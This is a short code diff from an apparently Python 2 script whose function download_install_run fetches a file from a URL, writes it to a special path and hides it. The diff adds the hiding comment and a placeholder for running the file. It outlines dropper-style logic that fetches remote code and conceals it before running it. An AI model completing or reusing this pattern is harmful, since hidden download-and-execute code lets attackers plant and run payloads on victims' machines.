@@ -58,13 +58,16 @@ def download_install_run(url, specialpath, fname):
     #Get a path for the file and unhide it.
     path = file_in_special_path(specialpath, fname)
     unhide_file(path)
-    #Save the file
+    #Save and hide the file
     u = urllib2.urlopen(url)
     f = open(path, "wb")
     f.write(u.read())
     f.close()
     u.close()
     hide_file(f)
+    
+    #Make a command to run the file
+    
         
 #Utility functions.  May be useful elsewhere
 def file_in_special_path(specialpath, fname):
